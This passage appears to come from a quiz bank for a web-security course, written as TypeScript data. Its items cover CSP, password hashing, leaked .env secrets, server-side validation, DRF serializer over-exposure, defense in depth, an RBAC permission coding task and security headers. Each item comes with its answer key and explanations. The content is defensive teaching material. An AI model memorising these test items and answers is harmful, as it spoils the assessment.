      { id: 'b', text: 'CSP encrypts all script tags so injected code can\'t be parsed by the browser. The default-src \'self\' directive encrypts the page content.', isCorrect: false },
      { id: 'c', text: 'CSP only blocks scripts from third-party CDNs. The injected script was blocked because it tried to load an external resource, not because it was inline.', isCorrect: false },
      { id: 'd', text: 'CSP didn\'t actually block the attack. The fetch failed because of CORS -- evil.com didn\'t have Access-Control-Allow-Origin for your domain.', isCorrect: false },
    ],
    explanation: 'Content Security Policy is a powerful HTTP header that tells the browser exactly which resources are allowed to load and execute on your page. script-src \'self\' means: only execute JavaScript files loaded from your own domain. This blocks: (1) Inline <script> tags (unless you add \'unsafe-inline\', which you should avoid). (2) Scripts loaded from other domains. (3) Event handlers like onclick="...". connect-src restricts where fetch(), XMLHttpRequest, and WebSocket can connect. Even if an attacker bypasses script-src (e.g., via a script gadget), connect-src prevents data exfiltration. CSP is defense-in-depth: it doesn\'t prevent XSS injection, but it prevents the injected code from doing damage. You can also use report-uri to get notified when CSP blocks something, helping you detect attacks. To allow specific inline scripts, use nonces (script-src \'nonce-abc123\') rather than \'unsafe-inline\'.',
    hints: [
      'script-src \'self\' blocks ALL inline scripts, not just ones from external sources',
      'connect-src limits where fetch() and XMLHttpRequest can send data',
    ],
    tags: ['csp', 'content-security-policy', 'xss-defense', 'security-headers'],
    concepts: ['web-security-xss'],
  },

  // =====================================================================
  // 4. PASSWORD & DATA SECURITY (4 questions, topic: API_DESIGN)
  // =====================================================================

  {
    id: 'sec-data-1',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.API_DESIGN,
    course: Course.WEB_DEV,
    question: 'Your database is breached and the users table is leaked. Which scenario results in the LEAST damage to your users, and why?',
    options: [
      { id: 'a', text: 'Passwords hashed with SHA256. SHA256 is cryptographically secure and used in Bitcoin, so it\'s the strongest option. Salts are optional but nice to have.', isCorrect: false },
      { id: 'b', text: 'Passwords hashed with bcrypt or argon2 (with unique salts). These algorithms are intentionally SLOW (bcrypt does thousands of rounds of computation per hash). An attacker trying 10 billion SHA256 hashes/second might only manage 10,000 bcrypt hashes/second. The salt (random value added per-password) means pre-computed rainbow tables are useless -- each password must be cracked individually.', isCorrect: true },
      { id: 'c', text: 'Passwords encrypted with AES-256. Encryption is stronger than hashing because you can decrypt and verify. As long as the encryption key wasn\'t in the same database, the passwords are safe.', isCorrect: false },
      { id: 'd', text: 'Passwords stored in Base64. Base64 isn\'t human-readable so it provides a layer of security. Attackers would need special tools to decode it.', isCorrect: false },
    ],
    explanation: 'Hashing vs Encryption: Hashing is ONE-WAY (you can\'t reverse a hash to get the password). Encryption is TWO-WAY (if the attacker finds the key, they decrypt everything). For passwords, you want ONE-WAY. SHA256 is fast by design -- it\'s meant for verifying file integrity, not passwords. GPUs can compute billions of SHA256 hashes per second, meaning an attacker can brute-force common passwords in minutes. bcrypt/argon2 are deliberately slow: bcrypt uses a configurable "work factor" (each increase doubles the time), and argon2 also uses configurable memory, making GPU attacks harder. Salt: a random value concatenated with the password before hashing. Without salt, identical passwords produce identical hashes, and attackers can use rainbow tables (pre-computed hash databases). With salt, each password hash is unique even if two users have the same password. Django uses PBKDF2 by default (also slow, configurable iterations) and stores the salt alongside the hash.',
    hints: [
      'The goal is to make brute-force attacks as expensive as possible',
      'Fast hashing algorithms (SHA256, MD5) are bad for passwords BECAUSE they are fast',
    ],
    tags: ['password-hashing', 'bcrypt', 'argon2', 'salt', 'security'],
    concepts: ['web-security-input-validation'],
  },

  {
    id: 'sec-data-2',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.API_DESIGN,
    course: Course.WEB_DEV,
    question: 'During a code review, you notice a teammate committed a .env file containing:\nDATABASE_URL=postgres://admin:secretpass@db.example.com/prod\nDJANGO_SECRET_KEY=abc123supersecret\nNEXT_PUBLIC_API_URL=https://api.myapp.com\n\nThey deleted the file and made a new commit. What are the problems here, and which variable is safe to expose?',
    options: [
      { id: 'a', text: 'Deleting the file and committing removes it from the repository. The secrets are safe now. All three variables should be kept private -- NEXT_PUBLIC_ is just a naming convention.', isCorrect: false },
      { id: 'b', text: 'Only DATABASE_URL is a problem. DJANGO_SECRET_KEY is just for CSRF tokens and isn\'t a real security concern. NEXT_PUBLIC_ variables are encrypted in the client bundle.', isCorrect: false },
      { id: 'c', text: 'Deleting the file doesn\'t help -- secrets are still in git history and must be rotated immediately. DATABASE_URL and DJANGO_SECRET_KEY are compromised. NEXT_PUBLIC_API_URL is the only safe one -- Next.js\'s NEXT_PUBLIC_ prefix means it\'s intentionally exposed to the client bundle. You must: rotate the database password, generate a new SECRET_KEY, use tools like git filter-branch or BFG to purge history.', isCorrect: true },
      { id: 'd', text: 'This is fine for development environments. .env files are only dangerous if they contain production credentials. Git history only goes back 30 days before being garbage collected.', isCorrect: false },
    ],
    explanation: 'Git never forgets: every commit is permanent in git history. Running `git log --all -p` or using tools like truffleHog can find every secret ever committed. Deleting a file only removes it from the current tree, not from history. Fix: (1) Rotate ALL compromised secrets immediately (new database password, new Django SECRET_KEY). (2) Use BFG Repo-Cleaner or git filter-repo to purge the file from all history. (3) Force-push the cleaned history. (4) Add .env to .gitignore. NEXT_PUBLIC_ prefix: In Next.js, environment variables prefixed with NEXT_PUBLIC_ are inlined into the JavaScript bundle at build time and sent to the browser. This is by design for non-sensitive values like public API URLs. DJANGO_SECRET_KEY is critical -- it\'s used for: signing session cookies, CSRF tokens, password reset tokens, and any cryptographic signing. If leaked, an attacker can forge sessions and impersonate any user. For production, use your hosting platform\'s secret management (Vercel env vars, AWS Secrets Manager, etc.).',
    hints: [
      'Git stores the full history of every file -- deleting a file doesn\'t remove it from past commits',
      'NEXT_PUBLIC_ is a Next.js convention that intentionally exposes variables to the client',
    ],
    tags: ['secrets', 'env-files', 'git-security', 'secret-rotation', 'security'],
    concepts: ['web-security-input-validation'],
  },

  {
    id: 'sec-data-3',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.BEGINNER,
    topic: Topic.API_DESIGN,
    course: Course.WEB_DEV,
    question: 'A junior developer argues: "We already validate the email format in our React form with Zod before submission. Why do we need to validate again in our Django serializer?" What is the correct response?',
    options: [
      { id: 'a', text: 'They\'re right. Validating twice is redundant and slows down the application. If the frontend validates with Zod, the data is guaranteed to be correct by the time it reaches Django.', isCorrect: false },
      { id: 'b', text: 'You only need server-side validation. Client-side validation is a waste of time because the server will catch errors anyway.', isCorrect: false },
      { id: 'c', text: 'Client-side validation is more secure because it runs in the user\'s browser, which is a trusted environment. Server validation is just a backup.', isCorrect: false },
      { id: 'd', text: 'Client-side validation can be completely bypassed -- an attacker can send requests directly to your API using curl, Postman, or a script, skipping your React form entirely. Client validation improves UX (instant feedback), but server validation is the actual security boundary. Always validate on both: client for UX, server for security.', isCorrect: true },
    ],
    explanation: 'NEVER trust the client. Everything in the browser can be manipulated: JavaScript can be modified, network requests can be intercepted and replayed, and attackers can call your API directly without ever loading your frontend. An attacker can: (1) Open browser DevTools and modify the JavaScript. (2) Use curl/Postman to send arbitrary data to your API. (3) Use a proxy like Burp Suite to modify requests in transit. Client-side validation (React forms, Zod schemas) provides instant feedback and reduces unnecessary server requests -- great for UX. Server-side validation (Django serializers, form validators) is the actual security boundary that prevents malicious data from entering your system. Both are needed: client for a smooth user experience, server for actual security. In Django REST Framework, serializer field validations (e.g., EmailField, IntegerField, validate_ methods) handle this automatically.',
    hints: [
      'Can you send an HTTP request to an API without using the website?',
      'curl, Postman, and scripts can bypass all frontend validation',
    ],
    tags: ['input-validation', 'client-server', 'zod', 'django-serializers', 'security'],
    concepts: ['web-security-input-validation', 'forms-zod-schema'],
  },

  {
    id: 'sec-data-4',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.API_DESIGN,
    course: Course.WEB_DEV,
    question: 'Your DRF API endpoint GET /api/users/me returns:\n{\n  "id": 1,\n  "username": "alice",\n  "email": "alice@example.com",\n  "password": "pbkdf2_sha256$260000$salt$hash",\n  "is_staff": true,\n  "is_superuser": false,\n  "last_login": "2024-01-15T10:30:00Z",\n  "social_security_number": "123-45-6789"\n}\n\nWhat is the security issue and how do you fix it in DRF?',
    options: [
      { id: 'a', text: 'Over-exposure of sensitive data. The API returns the password hash (which can be brute-forced offline), is_staff flag (reveals admin status to attackers), and SSN. Fix: explicitly list safe fields in your DRF serializer using the fields attribute (id, username, email only). Never use fields = "__all__" or exclude password alone. Use different serializers for different endpoints (list vs detail vs admin).', isCorrect: true },
      { id: 'b', text: 'The only issue is the SSN field. Password hashes are safe to expose because they can\'t be reversed. is_staff and is_superuser are needed for frontend routing.', isCorrect: false },
      { id: 'c', text: 'This is fine for an authenticated endpoint. Since the user is logged in, they should see all their own data. The frontend should just hide sensitive fields with CSS.', isCorrect: false },
      { id: 'd', text: 'Add a password to the API endpoint so only authorized users can access it. The fields themselves are fine to return if the endpoint is protected.', isCorrect: false },
    ],
    explanation: 'Data exposure is a top OWASP vulnerability. Problems: (1) Password hash: While bcrypt/PBKDF2 are slow to crack, exposing the hash lets attackers attempt offline brute-force at their leisure. (2) is_staff/is_superuser: Tells attackers which accounts are worth targeting for privilege escalation. (3) SSN: Obvious PII that should never transit over an API. Fix in DRF: Use explicit serializer fields to whitelist exactly what gets sent: class UserSerializer(serializers.ModelSerializer): class Meta: model = User; fields = [\'id\', \'username\', \'email\']. NEVER use fields = \'__all__\' -- new model fields automatically become exposed. Use exclude cautiously (easy to forget new sensitive fields). For different access levels, create separate serializers: UserPublicSerializer (id, username), UserPrivateSerializer (adds email), UserAdminSerializer (adds is_staff, last_login). In Django ORM, use .values(\'id\', \'username\') or .only() to avoid even loading sensitive columns from the database.',
    hints: [
      'Even hashed passwords are valuable to attackers for offline cracking',
      'Use explicit fields = [...] in serializers, never fields = "__all__"',
    ],
    tags: ['data-exposure', 'serializers', 'drf', 'owasp', 'security'],
    concepts: ['web-security-input-validation'],
  },

  // =====================================================================
  // 5. SECURITY ARCHITECTURE (3 questions, topic: PATTERNS_ARCHITECTURAL)
  // =====================================================================

  {
    id: 'sec-arch-1',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.ADVANCED,
    topic: Topic.PATTERNS_ARCHITECTURAL,
    course: Course.WEB_DEV,
    question: 'An attacker targets your Next.js + Django application. They chain multiple small vulnerabilities: (1) They find a reflected XSS in a search page, (2) use it to steal a session cookie that lacks the httpOnly flag, (3) use the cookie to access an admin API endpoint that doesn\'t check user roles. No single vulnerability is critical, but combined they achieve full admin access.\n\nWhat security principle would have prevented this, and how?',
    options: [
      { id: 'a', text: 'Zero trust architecture. The fix is to require re-authentication for every single API call. This eliminates the need for session cookies entirely.', isCorrect: false },
      { id: 'b', text: 'Defense in depth. If ANY single layer had held, the chain breaks: (1) CSP headers would block the XSS script execution. (2) httpOnly flag on cookies would prevent JavaScript from reading them. (3) RBAC on the admin endpoint would reject non-admin users. (4) Rate limiting would slow automated exploitation. Each layer assumes the others might fail. No single security measure is sufficient.', isCorrect: true },
      { id: 'c', text: 'Security through obscurity. The attacker found the admin endpoint because it was at a predictable URL (/api/admin). Renaming it to a random URL would prevent discovery.', isCorrect: false },
      { id: 'd', text: 'The principle of least privilege. The only fix needed is restricting the admin endpoint. The XSS and cookie issues are minor and don\'t need to be fixed if the endpoint is properly secured.', isCorrect: false },
    ],
    explanation: 'Defense in depth means implementing multiple overlapping security layers so that if one fails, others still protect the system. In this scenario, FOUR independent defenses could have stopped the attack: (1) Input sanitization + CSP headers prevent XSS from executing. (2) httpOnly + Secure + SameSite cookie flags prevent cookie theft via JavaScript. (3) Role-Based Access Control (RBAC) on endpoints ensures only admins can access admin APIs, regardless of how the request was authenticated. (4) Rate limiting and anomaly detection could flag unusual activity. Real-world attacks almost always chain multiple small vulnerabilities. That\'s why you implement ALL security layers, not just the ones that seem most important. This is why security reviews check for: HTTPS + auth + authorization + input validation + output encoding + security headers + rate limiting + logging + monitoring. Each layer is a link in a chain, and the chain is only as strong as its weakest link.',
    hints: [
      'The attacker needed THREE vulnerabilities to succeed. Fixing any one would break the chain.',
      'Each security measure should assume the others might fail',
    ],
    tags: ['defense-in-depth', 'security-layers', 'attack-chains', 'architecture'],
    concepts: ['pattern-architectural'],
  },

  {
    id: 'sec-arch-2',
    type: QuestionType.CODING,
    difficulty: Difficulty.BEGINNER,
    topic: Topic.PATTERNS_ARCHITECTURAL,
    course: Course.WEB_DEV,
    language: CodeLanguage.PYTHON,
    question: 'Implement a DRF custom permission class for Role-Based Access Control (RBAC). Your User model has a role field with values: "admin", "editor", "viewer".\n\nRules:\n- Admin: Full access (GET, POST, PUT, DELETE)\n- Editor: Can read and create/update (GET, POST, PUT) but NOT delete\n- Viewer: Read-only (GET only)\n- Unauthenticated: No access\n\nCreate the permission class and show how to apply it to a ViewSet.',
    starterCode: `from rest_framework.permissions import BasePermission

# TODO: Implement RoleBasedPermission
# - Check if user is authenticated
# - Check user.role against the HTTP method
# - Admin: all methods
# - Editor: GET, POST, PUT, PATCH, HEAD, OPTIONS
# - Viewer: GET, HEAD, OPTIONS only
class RoleBasedPermission(BasePermission):
    pass


# TODO: Apply to a ViewSet
# from rest_framework import viewsets
# from .models import Article
# from .serializers import ArticleSerializer`,
    testCases: [
      {
        input: 'Admin user sends DELETE request',
        expectedOutput: 'has_permission returns True',
        description: 'Admin should have full access including DELETE',
      },
      {
        input: 'Editor user sends DELETE request',
        expectedOutput: 'has_permission returns False',
        description: 'Editor should be denied DELETE access',
      },
      {
        input: 'Viewer user sends POST request',
        expectedOutput: 'has_permission returns False',
        description: 'Viewer should only have read access',
      },
      {
        input: 'Unauthenticated request',
        expectedOutput: 'has_permission returns False',
        description: 'Unauthenticated users should be denied all access',
      },
    ],
    solution: `from rest_framework.permissions import BasePermission
from rest_framework import viewsets
from rest_framework.decorators import action

ROLE_PERMISSIONS = {
    'admin': ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS'],
    'editor': ['GET', 'POST', 'PUT', 'PATCH', 'HEAD', 'OPTIONS'],
    'viewer': ['GET', 'HEAD', 'OPTIONS'],
}


class RoleBasedPermission(BasePermission):
    message = 'You do not have permission to perform this action.'

    def has_permission(self, request, view):
        if not request.user or not request.user.is_authenticated:
            return False

        user_role = getattr(request.user, 'role', None)
        if not user_role:
            return False

        allowed_methods = ROLE_PERMISSIONS.get(user_role, [])
        return request.method in allowed_methods


class ArticleViewSet(viewsets.ModelViewSet):
    permission_classes = [RoleBasedPermission]
    # queryset = Article.objects.all()
    # serializer_class = ArticleSerializer`,
    explanation: 'RBAC (Role-Based Access Control) assigns permissions based on roles rather than individual users. This is more maintainable than per-user permissions as your app scales. The permission class checks: (1) Is the user authenticated? (2) What role do they have? (3) Is the HTTP method allowed for that role? DRF calls has_permission() before the view executes. If it returns False, DRF returns a 403 Forbidden response. The ROLE_PERMISSIONS dict makes it easy to modify access levels without changing code logic. For more granular control, override has_object_permission() to check if a user can access a SPECIFIC object (e.g., editors can only edit their own articles). DRF\'s built-in IsAdminUser only checks is_staff, which is too coarse for most apps. Custom permissions give you the flexibility to implement your exact business rules. In production, consider django-guardian for object-level permissions or django-rules for predicate-based permissions.',
    hints: [
      'BasePermission requires implementing has_permission(self, request, view)',
      'Check request.method against allowed methods for the user\'s role',
      'Always check is_authenticated first -- anonymous users have no role',
    ],
    tags: ['rbac', 'permissions', 'drf', 'authorization', 'security'],
    concepts: ['web-security-auth-tokens', 'web-security-input-validation'],
  },

  {
    id: 'sec-arch-3',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.PATTERNS_ARCHITECTURAL,
    course: Course.WEB_DEV,
    question: 'Your Django app is deployed and you want to add security headers. Which combination of headers and their purposes is correct?',
    options: [
      { id: 'a', text: 'X-Content-Type-Options forces all responses to be JSON. X-Frame-Options allows only trusted iframes. Strict-Transport-Security enables HTTP/2. Referrer-Policy hides the Referer header from your own server logs.', isCorrect: false },
      { id: 'b', text: 'These headers are only needed for APIs, not for frontend pages. Django\'s SecurityMiddleware only works with Django templates, not with a separate Next.js frontend.', isCorrect: false },
      { id: 'c', text: 'X-Content-Type-Options: nosniff (prevents browsers from MIME-sniffing a response to a different content type, stopping attacks where a .jpg is actually executable JS). X-Frame-Options: DENY (blocks your site from being embedded in iframes, preventing clickjacking). Strict-Transport-Security: max-age=31536000 (tells browsers to ONLY use HTTPS for your domain for 1 year, even if user types http://). Referrer-Policy: same-origin (prevents leaking full URLs to third-party sites). Django\'s SecurityMiddleware sets most of these.', isCorrect: true },
      { id: 'd', text: 'X-Content-Type-Options encrypts the content type. X-Frame-Options is deprecated in favor of CSP. Strict-Transport-Security downgrades gracefully to HTTP. Referrer-Policy only applies to anchor tags.', isCorrect: false },
    ],
    explanation: 'Security headers are a critical defense layer that costs almost nothing to implement. X-Content-Type-Options: nosniff -- Without this, browsers may "sniff" content types. An attacker could upload a file named image.jpg that actually contains JavaScript. The browser might detect it\'s JS and execute it. "nosniff" forces the browser to trust the Content-Type header. X-Frame-Options: DENY -- Clickjacking attack: attacker loads your site in a transparent iframe, overlays it on their page, and tricks users into clicking your buttons (like "Delete Account"). DENY prevents your site from being framed entirely. SAMEORIGIN allows framing only by your own domain. Strict-Transport-Security (HSTS) -- After the first HTTPS visit, the browser will ALWAYS use HTTPS for your domain, even if the user types http:// or clicks an http:// link. This prevents SSL-stripping MITM attacks. Referrer-Policy: same-origin -- When users click links to external sites, the Referer header can leak private URLs (e.g., /admin/users/123/edit). "same-origin" only sends the Referer to your own domain. In Django, enable SecurityMiddleware and set: SECURE_BROWSER_XSS_FILTER, SECURE_CONTENT_TYPE_NOSNIFF, X_FRAME_OPTIONS, SECURE_HSTS_SECONDS, SECURE_HSTS_INCLUDE_SUBDOMAINS.',
    hints: [
      'Each header addresses a different attack vector -- they work together as defense-in-depth',
      'Django\'s SecurityMiddleware can set most of these with simple settings',
    ],
    tags: ['security-headers', 'hsts', 'clickjacking', 'x-frame-options', 'django'],
    concepts: ['web-security-xss'],
  },
];
